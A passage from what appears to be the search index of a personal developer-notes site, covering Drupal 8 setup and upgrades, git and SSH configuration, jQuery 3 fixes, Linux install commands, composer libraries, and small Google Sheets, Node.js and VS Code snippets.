```</p>"},{"location":"drupal/setup/#enable-twig-debugging","title":"Enable Twig Debugging","text":"<ul> <li>Create <code>sites/development.services.yml</code>:   <code>yaml   parameters:     http.response.debug_cacheability_headers: true     twig.config:       debug: true       auto_reload: true       cache: false     services:     cache.backend.null:       class: Drupal\\Core\\Cache\\NullBackendFactory</code></li> </ul>"},{"location":"drupal/setup/#via-drush","title":"Via drush:","text":"<p><code>drush variable-set theme_debug 1</code></p>"},{"location":"drupal/upgrade/","title":"Drupal 8 Core Upgrade","text":""},{"location":"drupal/upgrade/#update-core-and-modules","title":"Update Core and Modules","text":"<ul> <li>Fetch all new updated files:   <code>composer update   composer outdated   composer show -lo   composer update drupal/modulename --with-dependencies</code></li> <li>Update database:   <code>drush updb</code></li> <li>Update entities:   <code>drush entup</code></li> <li>Clear caches:   <code>drush cr</code></li> </ul>"},{"location":"drupal/upgrade/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>If updates are still available, check <code>composer.json</code> and update module versions (e.g. change <code>\"drupal/devel\": \"1.0-rc2\"</code> to <code>\"drupal/devel\": \"^1.0\"</code>).</li> <li>Run <code>composer update</code> again.</li> </ul>"},{"location":"drupal/upgrade/#common-issues","title":"Common Issues","text":"<ul> <li>Frontend Issues: jQuery 3 upgrade may break some functions and themes.</li> <li>PHP Version: Higher PHP version may be required.</li> <li>MySQL Errors (e.g. missing column revision-default):</li> </ul> <pre><code>  drush sql-query \"ALTER TABLE block_content_revision ADD COLUMN revision_default tinyint(5) AFTER revision_log\"\n</code></pre> <ul> <li>Config errors:</li> </ul> <pre><code>drush sql-query \"DELETE FROM config WHERE name = 'system.action.comment_delete_action';DELETE FROM config WHERE name = 'views.view.comment';TRUNCATE TABLE cache_config;\"\n  ```\n- **Fields deletion pending error:**\n</code></pre> <p>drush php:eval 'field_purge_batch(50000);' ```</p>"},{"location":"drupal/upgrade/#after-upgrade","title":"After Upgrade","text":"<ul> <li>Login and check <code>/admin/reports/updates</code> for module updates.</li> <li>If further updates are needed, adjust <code>composer.json</code> as above and repeat the process.</li> </ul>"},{"location":"git/commands/","title":"Common Git Commands","text":""},{"location":"git/commands/#ssh-key-management-for-multiple-projects","title":"SSH Key Management for Multiple Projects","text":""},{"location":"git/commands/#create-ssh-keys","title":"Create SSH Keys","text":"<pre><code>ssh-keygen -f ~/.ssh/personal\n</code></pre>"},{"location":"git/commands/#configure-ssh-agent","title":"Configure SSH Agent","text":"<pre><code>eval \"$(ssh-agent -s)\"\nssh-add ~/.ssh/personal\n</code></pre>"},{"location":"git/commands/#edit-ssh-config-sshconfig","title":"Edit SSH Config (~/.ssh/config)","text":"<pre><code>Host bitbucket.org\n  HostName bitbucket.org\n  User git\n  IdentityFile ~/.ssh/id_rsa\nHost personal\n  HostName bitbucket.org\n  User git\n  IdentityFile ~/.ssh/personal\n</code></pre>"},{"location":"git/commands/#setting-git-remotes","title":"Setting Git Remotes","text":""},{"location":"git/commands/#https-remote-example","title":"HTTPS Remote Example","text":"<pre><code>[remote \"origin\"]\nurl = https://&lt;USER&gt;@bitbucket.org/&lt;TEAM&gt;/&lt;REPO&gt;.git\n</code></pre>"},{"location":"git/commands/#ssh-remote-example","title":"SSH Remote Example","text":"<pre><code>[remote \"origin\"]\nurl = git@bitbucket.org:&lt;TEAM&gt;/&lt;REPO&gt;.git\n</code></pre>"},{"location":"git/commands/#clone-and-set-remote","title":"Clone and Set Remote","text":"<pre><code>git clone personal:&lt;TEAM&gt;/&lt;REPO&gt;.git\ngit remote set-url origin personal:&lt;TEAM&gt;/&lt;REPO&gt;.git\n</code></pre>"},{"location":"git/commands/#bitbucket-integration","title":"Bitbucket Integration","text":""},{"location":"git/commands/#link-repo-commit-messages-to-task-id","title":"Link Repo Commit Messages to Task ID","text":"<ul> <li> <p>Go to Repository Settings &gt; Links &gt; Create New Link</p> </li> <li> <p>Link URL: <code>https://&lt;COMPANY&gt;.me/projects/&lt;project-id&gt;/tasks/\\1</code></p> </li> <li>Link TEXT: <code>&lt;project-code&gt;-(\\d+)</code></li> </ul>"},{"location":"git/commands/#advanced-git-commands","title":"Advanced Git Commands","text":""},{"location":"git/commands/#amend-last-commit","title":"Amend Last Commit","text":"<pre><code>git commit --amend -m \"New commit message\"\n</code></pre>"},{"location":"git/commands/#commit-with-no-edit","title":"Commit With No Edit","text":"<pre><code>git commit --amend --no-edit\n</code></pre>"},{"location":"git/commands/#cherry-pick-a-commit-from-another-branch","title":"Cherry-pick a Commit from Another Branch","text":"<pre><code>git cherry-pick &lt;commit-hash&gt;\n</code></pre>"},{"location":"git/commands/#rebase-instead-of-merge","title":"Rebase Instead of Merge","text":"<ul> <li>Start an interactive rebase:</li> </ul> <pre><code>git rebase -i &lt;base-branch&gt;\n</code></pre> <ul> <li>Rebase your feature branch onto main:</li> </ul> <pre><code>git checkout feature-branch\ngit rebase main\n</code></pre> <ul> <li>Continue after resolving conflicts:</li> </ul> <pre><code>git rebase --continue\n</code></pre> <ul> <li>Abort a rebase:</li> </ul> <pre><code>git rebase --abort\n</code></pre>"},{"location":"git/common-issues/","title":"Git Common Issues","text":""},{"location":"git/common-issues/#bitbucket-link-repo-commit-messages-to-task-id","title":"Bitbucket: Link repo commit messages to task ID","text":"<ul> <li>Go to Repository Settings &gt; Links &gt; Create New Link</li> <li>Link URL: <code>https://&lt;COMPANY_DOMAIN&gt;/projects/&lt;project-id in intranet&gt;/tasks/\\1</code></li> <li>Link TEXT: <code>&lt;project-code for the project&gt;-(\\d+)</code></li> </ul>"},{"location":"git/common-issues/#issues","title":"Issues","text":""},{"location":"git/common-issues/#pull-not-working-branch-diverged","title":"Pull not working, branch diverged","text":"<pre><code>git reset --hard origin/develop\n</code></pre>"},{"location":"git/common-issues/#pushpull-stuck-slow-ssh","title":"Push/pull stuck (slow ssh)","text":"<ul> <li>Switch to https in <code>.git/config</code>:</li> </ul> <pre><code>[remote \"origin\"]\nurl = https://&lt;USER&gt;@bitbucket.org/&lt;TEAM&gt;/&lt;REPO&gt;.git\n</code></pre>"},{"location":"jquery/upgrade-issues/","title":"jQuery 3 Upgrade Issues","text":""},{"location":"jquery/upgrade-issues/#jquery-3-upgrade-issues_1","title":"jQuery 3 Upgrade Issues","text":"<ul> <li>Error with owl carousel: <code>TypeError: $(...).find(...).andSelf is not a function</code></li> <li>Fix:</li> </ul> <pre><code>$.fn.andSelf = function () {\n  return this.addBack.apply(this, arguments);\n}\n</code></pre> <ul> <li>Bootstrap's JavaScript requires jQuery 1.9.1 or higher, but lower than 3. Use bootstrap v3.3.7.</li> </ul>"},{"location":"jquery/upgrade-issues/#custom-validation-example","title":"Custom Validation Example","text":"<pre><code>function customValidateForm(inputForm) {\n  // ...existing code...\n}\ncustomValidateForm('webform-submission-kids-library-call-me-back-form');\n</code></pre>"},{"location":"jquery/upgrade-issues/#week-picker","title":"Week Picker","text":"<ul> <li>See: https://github.com/Prezent/jquery-weekpicker</li> <li>Example: http://jsfiddle.net/manishma/AVZJh/light/</li> </ul>"},{"location":"linux-mac/commands/","title":"Commands used","text":""},{"location":"linux-mac/commands/#file-permission-issues-on-mac","title":"File Permission Issues on Mac","text":"<ul> <li>Change ownership:</li> </ul> <pre><code>sudo chown &lt;user-name&gt;:&lt;group-name&gt; -R &lt;file-path&gt;\nsudo chown $(whoami):$(id -gn) -R &lt;file-path&gt;\n\n</code></pre> <ul> <li>Change permission:</li> </ul> <pre><code>sudo chmod 755 -R &lt;file-path&gt;\n</code></pre>"},{"location":"linux-mac/commands/#install-composer-linux","title":"Install Composer (Linux)","text":"<pre><code>php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\nphp composer-setup.php\nphp -r \"unlink('composer-setup.php');\"\nsudo mv composer.phar /usr/local/bin/composer\ncomposer\n</code></pre>"},{"location":"linux-mac/commands/#install-drush-linux","title":"Install Drush (Linux)","text":"<pre><code>wget -O drush.phar https://github.com/drush-ops/drush-launcher/releases/latest/download/drush.phar\nchmod +x drush.phar\nsudo mv drush.phar /usr/local/bin/drush\ndrush init\n</code></pre>"},{"location":"linux-mac/commands/#install-nodejs-and-npm","title":"Install Node.js and npm","text":"<pre><code>sudo apt-get update\nsudo apt-get install nodejs\nsudo apt-get install npm\nsudo apt-get install build-essential\nsudo apt-get install build-essential libssl-dev\ncurl -sL https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh -o install_nvm.sh\nbash install_nvm.sh\nsource ~/.profile\nnvm ls-remote\nnvm install 8.10.0\nnvm use 8.10.0\nnode -v\n</code></pre>"},{"location":"linux-mac/commands/#install-electron","title":"Install Electron","text":"<pre><code>npm install -g electron\ngit clone https://github.com/electron/electron-quick-start\ncd electron-quick-start\nnpm install &amp;&amp; npm start\n</code></pre>"},{"location":"linux-mac/commands/#install-angular-cli","title":"Install Angular CLI","text":"<pre><code>npm install -g @angular/cli\nng -v\nng new my-angular-app\ncd my-angular-app\nng serve --open\nng build --prod --base-href /mentor/ --aot\n</code></pre>"},{"location":"linux-mac/deployment/","title":"Server Deployment","text":""},{"location":"linux-mac/deployment/#common-deployment-issues-while-ssl","title":"Common deployment issues while SSL","text":"<ul> <li>Modify the Vhost as below:</li> </ul> <pre><code>&lt;VirtualHost *:443&gt;\n ServerName &lt;PROJECT&gt;.local.com\n DocumentRoot \"/var/www/html/&lt;PROJECT&gt;\"\n SSLProxyEngineOn\n ProxyPass \"/jwt\" \"https://&lt;API_SERVER&gt;/jwt\"\n ProxyPass \"/api\" \"https://&lt;API_SERVER&gt;/api\"\n&lt;/VirtualHost&gt;\n</code></pre>"},{"location":"linux-mac/deployment/#curl-commands","title":"CURL commands","text":"<pre><code>curl -sILXGET dev-selfservice.fmservice.com\n</code></pre>"},{"location":"linux-mac/deployment/#live-reloading-not-working-issue","title":"Live reloading not working issue","text":"<pre><code>sudo sysctl fs.inotify.max_user_watches=524288 &amp;&amp; sudo sysctl -p --system\n</code></pre>"},{"location":"linux-mac/deployment/#file-handling","title":"File handling","text":"<ul> <li>Change ownership:</li> </ul> <pre><code>sudo chown &lt;user-name&gt;:&lt;group-name&gt; -R &lt;file-path&gt;\n</code></pre> <ul> <li>Change permission:</li> </ul> <pre><code>sudo chmod 755 -R /var/www/html/\n</code></pre> <ul> <li>Move/rename/copy/delete/zip/unzip files:</li> </ul> <pre><code>sudo mv {old-file} {new-file}\nsudo cp -i -r /media/projects/hyn007 /var/www/html/hyn\nrm {file-name}\nzip -r \"archive-$(date +\"%Y-%m-%d\").zip\" &lt;folder&gt;\nunzip file.zip -d destination_folder\ndu -sh *\n</code></pre> <ul> <li>Kill a process:</li> </ul> <pre><code>kill -9 $(lsof -t -i:4200)\n</code></pre>"},{"location":"tools/composer/","title":"Composer: Add Custom Libraries in web Folder","text":""},{"location":"tools/composer/#add-to-composerjson","title":"Add to composer.json","text":"<p>Add to the <code>repositories</code> array:</p> <pre><code>{\n  \"type\": \"package\",\n  \"package\": {\n    \"name\": \"desandro/masonry\",\n    \"version\": \"3.3.1\",\n    \"type\": \"drupal-library\",\n    \"dist\": {\n      \"url\": \"https://github.com/desandro/masonry/archive/v3.3.1.zip\",\n      \"type\": \"zip\"\n    }\n  }\n}\n</code></pre> <p>Add a custom installation path in the <code>extra</code> object:</p> <pre><code>\"extra\": {\n  \"installer-paths\": {\n    \"web/core\": [\"type:drupal-core\"],\n    \"web/libraries/{$name}\": [\"type:drupal-library\"]\n  }\n}\n</code></pre> <p>Install the library:</p> <pre><code>composer require desandro/masonry\n</code></pre>"},{"location":"tools/composer/#example-2","title":"Example 2","text":"<pre><code>\"repositories\": [\n  {\n    \"type\": \"composer\",\n    \"url\": \"https://packages.drupal.org/8\"\n  },\n  {\n    \"type\": \"package\",\n    \"package\": {\n      \"name\": \"enyo/dropzone\",\n      \"version\": \"5.7.1\",\n      \"type\": \"drupal-library\",\n      \"dist\": {\n        \"url\": \"https://github.com/enyo/dropzone/archive/v5.7.1.zip\",\n        \"type\": \"zip\"\n      }\n    }\n  }\n]\n</code></pre> <p>Then run:</p> <pre><code>composer require drupal/dropzonejs enyo/dropzone\n</code></pre>"},{"location":"tools/google-sheets/","title":"Google Sheets Scripts and Tips","text":""},{"location":"tools/google-sheets/#remove-line-duplicates-in-google-sheets","title":"Remove line duplicates in Google Sheets","text":"<ul> <li>Tools &gt; Script Editor, add and run:</li> </ul> <pre><code>function removeDuplicates() {\n  var sheet = SpreadsheetApp.getActiveSheet();\n  var data = sheet.getDataRange().getValues();\n  var newData = new Array();\n  for(i in data){\n    var row = data[i];\n    var duplicate = false;\n    for(j in newData){\n      if(row.join() == newData[j].join()){\n        duplicate = true;\n      }\n    }\n    if(!duplicate){\n      newData.push(row);\n    }\n  }\n  sheet.clearContents();\n  sheet.getRange(1, 1, newData.length, newData[0].length).setValues(newData);\n}\n</code></pre>"},{"location":"tools/google-sheets/#split-cell-contents-into-rows-based-on-carriage-return","title":"Split cell contents into rows based on carriage return","text":"<pre><code>=transpose(split(join(char(10),A1:A4),char(10)))\n</code></pre>"},{"location":"tools/logging-with-node/","title":"Node.js Logging","text":""},{"location":"tools/logging-with-node/#logging-function-in-nodejs","title":"Logging function in Node.js","text":"<pre><code>function writeLogInFile(message, object = false, fileName = 'node-server-custom-log.txt') {\n  const getCircularReplacer = () =&gt; {\n    const seen = new WeakSet();\n    return (key, value) =&gt; {\n      if (typeof value === \"object\" &amp;&amp; value !== null) {\n        if (seen.has(value)) return;\n        seen.add(value);\n      }\n      return value;\n    };\n  };\n  let filePath = `/var/log/&lt;project-path&gt;/${fileName}`;\n  let messageLog = \"\\r\\n\" + new Date().toLocaleString() + ' &gt;&gt; ';\n  messageLog += object ? JSON.stringify(message, getCircularReplacer()) : message;\n  if (fs.existsSync(filePath))\n    fs.appendFile(filePath, messageLog, err =&gt; {\n      if (err) throw err;\n      console.log('The message was appended to : ' + filePath);\n    });\n  else\n    fs.writeFile(filePath, messageLog, err =&gt; {\n      if (err) throw err;\n      console.log('The message was written to : ' + filePath);\n    });\n}\n</code></pre>"},{"location":"tools/regex/","title":"Regular Expressions","text":""},{"location":"tools/regex/#regular-expressions_1","title":"Regular Expressions","text":"<ul> <li>Find contents of pattern: <code>{{'xhsgdksdhf jsjd hfsjdfh skdjfhsj fhsdkj'|t}}</code></li> <li>Regex: <code>\\{\\{'([A-Z ]+)'\\|t\\}\\}</code></li> <li>Find Arabic texts in a file:   <code>[^\\x00-\\x80]+</code></li> </ul>"},{"location":"tools/vscode/","title":"VS Code Settings and Extensions","text":""},{"location":"tools/vscode/#vs-code-settings","title":"VS Code Settings","text":"<ul> <li>Map custom extensions to languages, recommended extensions, and settings.</li> <li>Example settings:</li> </ul> <pre><code>{\n  \"files.associations\": {\n    \"*.inc\": \"php\",\n    \"*.module\": \"php\",\n    \"*.install\": \"php\",\n    \"*.theme\": \"php\",\n    \"*.tpl.php\": \"php\",\n    \"*.test\": \"php\",\n    \"*.php\": \"php\",\n    \"*.info\": \"ini\"\n  },\n  \"editor.tabSize\": 2,\n  \"editor.insertSpaces\": true,\n  \"editor.formatOnPaste\": true,\n  \"editor.formatOnSave\": false,\n  \"files.trimTrailingWhitespace\": true,\n  \"files.insertFinalNewline\": true\n}\n</code></pre> <ul> <li>Recommended extensions: Drupal 8 Snippets, Drupal 8 Twig Snippets, JS-CSS-HTML Formatter, PHP Intelephense, Twig, Twig Language 2, YAML</li> </ul>"},{"location":"tools/vscode/#php-indentation","title":"PHP Indentation","text":"<ul> <li>Install php-cs-fixer:</li> </ul> <pre><code>curl -L http://cs.sensiolabs.org/download/php-cs-fixer-v2.phar -o php-cs-fixer\nsudo chmod a+x php-cs-fixer\nsudo mv php-cs-fixer /usr/local/bin/php-cs-fixer\ncomposer global require friendsofphp/php-cs-fixer\n</code></pre> <ul> <li>VS Code extension: kokororin.vscode-phpfmt</li> </ul>"},{"location":"tools/vscode/#php-intellisense","title":"PHP Intellisense","text":"<ul> <li>https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-intellisense</li> </ul>"},{"location":"tools/vscode/#twig-intellisense","title":"Twig Intellisense","text":"<ul> <li>https://marketplace.visualstudio.com/items?itemName=mblode.twig-language</li> </ul>"}]}